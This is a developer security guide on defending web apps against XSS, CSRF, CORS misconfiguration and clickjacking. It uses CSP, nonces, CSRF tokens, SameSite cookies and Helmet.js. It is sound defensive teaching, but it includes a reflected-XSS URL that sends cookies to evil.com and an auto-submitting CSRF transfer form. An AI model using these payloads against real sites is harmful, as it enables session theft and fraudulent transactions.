# XSS & CSRF Protection

## XSS: Three Attack Vectors

**Reflected XSS:** malicious script is embedded in a URL parameter. The server reflects it
back in the HTML response without sanitization. The victim must click a crafted link:
```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Stored XSS:** malicious script is persisted in the database (comments, profile fields, post
titles) and rendered to every user who views the content. More dangerous — no user interaction
required beyond visiting the page.

**DOM-based XSS:** the script is executed by client-side JavaScript that reads attacker-controlled
data (URL fragment, `window.name`, `postMessage`) and writes it to the DOM without sanitization:
```js
// VULNERABLE
document.getElementById("output").innerHTML = window.location.hash.slice(1);
// SAFE
document.getElementById("output").textContent = window.location.hash.slice(1);
```

## Content Security Policy

CSP is an HTTP header that restricts which scripts, styles, images, and connections a page
can load. It is the most powerful XSS mitigation:

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self' 'nonce-{RANDOM}';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  font-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

Start with `default-src 'none'` and add only what is needed. Avoid `'unsafe-inline'` and
`'unsafe-eval'` — they disable most XSS protection.

## Nonce-Based CSP

A cryptographic nonce (number used once) allows specific inline scripts while blocking all
others. Generate a fresh nonce per request:

```ts
import crypto from "crypto";

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  res.setHeader(
    "Content-Security-Policy",
    `script-src 'nonce-${res.locals.nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none';`
  );
  next();
});
```

```html
<script nonce="<%= nonce %>">
  // This inline script is allowed; injected scripts without the nonce are blocked
</script>
```

`'strict-dynamic'` propagates trust to scripts loaded by trusted scripts, enabling module
loaders without adding more origins to the allowlist.

## CSRF Attack Mechanics

CSRF exploits the browser's automatic cookie sending. An attacker hosts a page that makes
a state-changing request to your site using the victim's cookies:

```html
<!-- On evil.com -->
<form action="https://bank.example.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById("csrf").submit();</script>
```

The browser sends the victim's session cookie automatically. The bank sees an authenticated
request from the victim's session.

## CSRF Token Pattern

Generate a random token per session, embed it in forms, and verify it on the server:

```ts
// Session-tied CSRF token generation
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString("hex");
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// Verify on state-changing requests
function verifyCsrf(req: Request, res: Response, next: NextFunction) {
  const token = req.body._csrf || req.headers["x-csrf-token"];
  if (!token || !crypto.timingSafeEqual(
    Buffer.from(req.session.csrfToken),
    Buffer.from(token)
  )) {
    return res.status(403).json({ error: "Invalid CSRF token" });
  }
  next();
}
```

## SameSite Cookie Attribute

SameSite is the modern CSRF defense, built into the browser:

- **`SameSite=Strict`** — cookies are never sent on cross-site requests. Most secure. Breaks
  OAuth flows and third-party embeds.
- **`SameSite=Lax`** — cookies are sent on top-level navigation (clicking a link) but not on
  subresource requests (images, iframes, fetch). Good default for most apps.
- **`SameSite=None`** — cookies sent cross-site; requires `Secure`. Only for embedded widgets,
  payment iframes, or third-party contexts.

```ts
res.cookie("session", sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  path: "/",
  maxAge: 24 * 60 * 60 * 1000,
});
```

## CORS Configuration

CORS controls which origins can make cross-site fetch requests. Misconfiguration is common:

```ts
// VULNERABLE — reflects any origin
app.use(cors({ origin: req.headers.origin, credentials: true }));

// SECURE — explicit allowlist
const allowedOrigins = new Set([
  "https://app.example.com",
  "https://admin.example.com",
]);

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.has(origin)) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
}));
```

Never use `origin: "*"` with `credentials: true` — browsers block this combination. Never
reflect the request origin blindly.

## Security Headers Checklist with Helmet.js

Helmet sets multiple security headers with sensible defaults:

```ts
import helmet from "helmet";

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'none'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      formAction: ["'self'"],
    },
  },
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  noSniff: true,          // X-Content-Type-Options: nosniff
  frameguard: { action: "deny" },  // X-Frame-Options: DENY (clickjacking)
  xssFilter: false,       // Legacy header, superseded by CSP
}));
```

Verify your headers with securityheaders.com after deployment. A-grade requires CSP, HSTS,
X-Frame-Options, X-Content-Type-Options, and Referrer-Policy at minimum.

## CSP Header Builder Decision Tree

Work through these questions in order to build a correct policy:

```
1. Do you have any inline scripts you own?
   YES → use nonce (generate per request) or hash (sha256 of exact content)
   NO  → omit 'unsafe-inline'; scripts must come from listed origins only

2. Do you load scripts from a CDN?
   YES → add CDN origin to script-src (e.g. https://cdn.jsdelivr.net)
   NO  → script-src 'self' is sufficient

3. Do you use eval(), new Function(), or dynamic require()?
   YES → add 'unsafe-eval' (weakens XSS protection; eliminate if possible)
   NO  → omit 'unsafe-eval'

4. Do you embed third-party iframes (YouTube, maps, payments)?
   YES → add their origin to frame-src
   NO  → frame-src 'none'

5. Do you load fonts from Google Fonts or similar?
   YES → add origin to font-src and style-src
   NO  → font-src 'self'; style-src 'self'

6. Do you make API calls to other origins?
   YES → list each origin in connect-src
   NO  → connect-src 'self'
```

Minimum strict policy for a plain server-rendered app with no inline scripts:

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self';
  font-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

## Trusted Types API for DOM XSS Prevention

Trusted Types is a browser API that makes DOM XSS impossible by requiring that dangerous
sinks (`.innerHTML`, `document.write`, `eval`) only accept typed objects, not raw strings:

```ts
// Enable via CSP header:
// Content-Security-Policy: require-trusted-types-for 'script'; trusted-types myPolicy

// Create a sanitizing policy
const policy = trustedTypes.createPolicy("myPolicy", {
  createHTML(input: string): string {
    // Only allow through a real sanitizer — DOMPurify is trusted-types aware
    return DOMPurify.sanitize(input);
  },
  createScriptURL(input: string): string {
    // Only allow known safe origins
    const url = new URL(input);
    if (!["myapp.com", "cdn.myapp.com"].includes(url.hostname)) {
      throw new Error("Untrusted script URL");
    }
    return input;
  },
});

// Usage — assignment to innerHTML now requires the typed object
element.innerHTML = policy.createHTML(userSuppliedHtml);
// element.innerHTML = userSuppliedHtml; // ← browser blocks this with Trusted Types
```

Trusted Types works in Chrome/Edge. For Firefox, fall back to DOMPurify alone. The CSP
header causes violations to be logged (or blocked) even in unsupported browsers via the
`Content-Security-Policy-Report-Only` header for gradual rollout.

## Clickjacking Defense

Clickjacking overlays your page in a transparent iframe and tricks the user into clicking
your buttons:

**`frame-ancestors` CSP directive** (preferred, granular):

```
Content-Security-Policy: frame-ancestors 'none';           # never frameable
Content-Security-Policy: frame-ancestors 'self';           # only same origin
Content-Security-Policy: frame-ancestors https://partner.com; # specific origin
```

**`X-Frame-Options` header** (legacy, for older browsers):

```
X-Frame-Options: DENY          # never frameable
X-Frame-Options: SAMEORIGIN    # only same origin
```

`frame-ancestors` takes precedence in modern browsers and is more expressive. Helmet sets
`X-Frame-Options: DENY` by default; add `frame-ancestors 'none'` to your CSP to cover both.

## SameSite Compatibility Deep Dive

Browser behavior changed significantly between 2019 and 2021:

| Browser version          | `SameSite` default if omitted |
|--------------------------|-------------------------------|
| Chrome < 80 (Feb 2020)   | None (cookies sent cross-site)|
| Chrome ≥ 80              | Lax                           |
| Safari (all versions)    | No enforcement (treats as None)|
| Firefox ≥ 96 (Jan 2022)  | Lax                           |

**Practical rules:**

- Always set `SameSite` explicitly — never rely on the default.
- Use `Strict` for session cookies. Use `Lax` only when your app is embedded as a top-level
  navigation target from another site (e.g., an OAuth callback that must carry the cookie).
- For third-party cookies (`SameSite=None`), you must also set `Secure`. Safari has
  additional restrictions on third-party cookies regardless of `SameSite`.
- Test your auth flow in Safari explicitly — it does not respect `SameSite=Strict` for
  initial cross-site navigation (clicking a link from another site).

## Complete CSRF Token Implementation in Express

```ts
import express from "express";
import session from "express-session";
import crypto from "crypto";

const app = express();

app.use(express.json());
app.use(session({
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, secure: true, sameSite: "strict" },
}));

// Middleware: generate CSRF token once per session
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString("hex");
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// Expose token to frontend (GET endpoint, no state change)
app.get("/api/csrf-token", (req, res) => {
  res.json({ csrfToken: req.session.csrfToken });
});

// CSRF verification middleware for state-changing methods
function requireCsrf(req: express.Request, res: express.Response, next: express.NextFunction) {
  if (["GET", "HEAD", "OPTIONS"].includes(req.method)) return next();

  const token =
    (req.body as Record<string, string>)?._csrf ||
    req.headers["x-csrf-token"] as string;

  const sessionToken = req.session.csrfToken;

  if (!token || !sessionToken) {
    return res.status(403).json({ error: "CSRF token missing" });
  }

  // Timing-safe comparison prevents length oracle attacks
  try {
    const a = Buffer.from(token, "hex");
    const b = Buffer.from(sessionToken, "hex");
    if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
      return res.status(403).json({ error: "CSRF token invalid" });
    }
  } catch {
    return res.status(403).json({ error: "CSRF token invalid" });
  }

  next();
}

app.use("/api", requireCsrf);

// Frontend usage: fetch the token once, attach to every mutating request
// fetch('/api/transfer', {
//   method: 'POST',
//   headers: { 'X-CSRF-Token': csrfToken, 'Content-Type': 'application/json' },
//   body: JSON.stringify({ amount: 100 }),
// });
```

## Security Headers Audit Checklist

Run this checklist after every deployment to a new environment:

```
[ ] Content-Security-Policy    — no 'unsafe-inline', no 'unsafe-eval', has frame-ancestors
[ ] Strict-Transport-Security  — maxAge ≥ 31536000, includeSubDomains, preload
[ ] X-Content-Type-Options     — nosniff (prevents MIME-sniffing attacks)
[ ] X-Frame-Options            — DENY or SAMEORIGIN (clickjacking)
[ ] Referrer-Policy            — strict-origin-when-cross-origin or no-referrer
[ ] Permissions-Policy         — disable unused browser features (camera, microphone, geolocation)
[ ] Cross-Origin-Opener-Policy — same-origin (isolates browsing context, prevents Spectre)
[ ] Cross-Origin-Resource-Policy — same-origin or same-site
[ ] Cache-Control              — no-store for authenticated API responses
[ ] Set-Cookie flags           — Secure, HttpOnly, SameSite on every auth cookie
```

Full Helmet.js configuration covering all of the above:

```ts
import helmet from "helmet";
import crypto from "crypto";

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  next();
});

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'none'"],
        scriptSrc: ["'self'", (req, res) => `'nonce-${(res as any).locals.nonce}'`],
        styleSrc: ["'self'"],
        imgSrc: ["'self'", "data:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        frameAncestors: ["'none'"],
        formAction: ["'self'"],
        baseUri: ["'self'"],
      },
    },
    strictTransportSecurity: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
    referrerPolicy: { policy: "strict-origin-when-cross-origin" },
    permittedCrossDomainPolicies: false,
    crossOriginOpenerPolicy: { policy: "same-origin" },
    crossOriginResourcePolicy: { policy: "same-origin" },
    noSniff: true,
    frameguard: { action: "deny" },
    xssFilter: false, // CSP supersedes this legacy header
  })
);

// Cache-control for API routes
app.use("/api", (req, res, next) => {
  res.setHeader("Cache-Control", "no-store");
  next();
});
```